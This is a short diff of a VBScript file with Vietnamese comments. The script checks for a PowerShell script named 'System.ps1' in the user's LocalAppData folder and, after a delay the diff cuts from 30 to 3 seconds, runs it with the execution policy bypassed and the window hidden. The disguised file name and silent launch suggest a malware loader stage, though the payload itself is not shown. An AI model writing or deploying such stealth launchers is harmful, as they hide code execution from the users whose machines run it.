@@ -6,7 +6,7 @@ localPath = objShell.ExpandEnvironmentStrings("%LocalAppData%") & "\System.ps1"
 
 ' Kiểm tra file có tồn tại không
 If objFSO.FileExists(localPath) Then
-    WScript.Sleep 30000
+    WScript.Sleep 3000
     objShell.Run "powershell.exe -ExecutionPolicy Bypass -File """ & localPath & """", 0, False
 Else
     ' Hiển thị thông báo lỗi nếu không tìm thấy file
